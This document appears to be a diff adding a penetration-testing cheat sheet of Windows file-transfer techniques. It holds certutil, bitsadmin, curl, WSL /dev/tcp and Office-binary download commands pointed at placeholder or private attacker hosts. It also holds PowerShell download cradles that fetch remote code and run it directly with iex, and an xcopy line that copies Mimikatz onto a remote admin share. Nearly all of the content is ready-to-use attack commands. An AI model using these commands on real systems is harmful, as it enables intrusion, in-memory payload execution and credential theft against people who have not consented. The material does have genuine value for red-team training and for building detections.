@@ -1,0 +1,77 @@
+# File Transfer Techniques
+
+### CMD
+
+```
+certutil.exe -f -urlcache -split 'http://<IP>:<port>/<file>'
+cmd.exe /c certutil.exe -f -urlcache -split 'http://<IP>:<port>/<file>'
+```
+
+### Powershell
+
+```bash
+powershell -c (new-object System.Net.WebClient).DownloadFile(‘http://<IP>:<port>/<file>,'<Destination>')
+(New-Object System.Net.WebClient).DownloadFile("http://<IP>/<File>", "C:\Windows\Temp\file.ps1")
+Invoke-WebRequest "http://<IP>/<File>" -OutFile "C:\Windows\Temp\File.ps1"
+
+# Standard download cradle
+iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")
+
+# Internet Explorer Downoad cradle
+$ie=New-Object -ComObject
+InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://<IP>/<File>
+');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+
+# Requires PowerShell V3+
+iex (iwr 'http://<IP>/<File>')
+iex (iwr 'http://<IP>/<File>' -outfile .\<File> -UseBasicParsing)
+
+$h=New-Object -ComObject
+Msxml2.XMLHTTP;$h.open('GET','http://<IP>/<File>',$false);$h.send();iex
+$h.responseText
+
+$wr = [System.NET.WebRequest]::Create("http://<IP>/<File>")
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+
+### BITS
+
+```
+bitsadmin.exe /transfer /Download /priority Foreground http://<IP>/<File> c:\Windows\Temp\<File>
+```
+
+### Curl
+
+Windows 10 17063 and later comes with Curl installed by default.
+
+```
+curl http://<IP>:<port>/<file> --output c:\<file>
+```
+
+### Microsoft Office
+
+```
+Excel.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+WinWord.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+```
+
+### SMB
+
+\<WIP>
+
+### WSL
+
+```
+wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+```
+
+**XCOPY**\
+
+
+```batch
+# Requires admin to on remote system to copy
+echo F | xcopy [Source] [Destination] /Y
+echo F | xcopy C:\Tools\Mimikatz.exe \\SRV02\C$\Users\Public\Mimikatz.exe /Y
+```
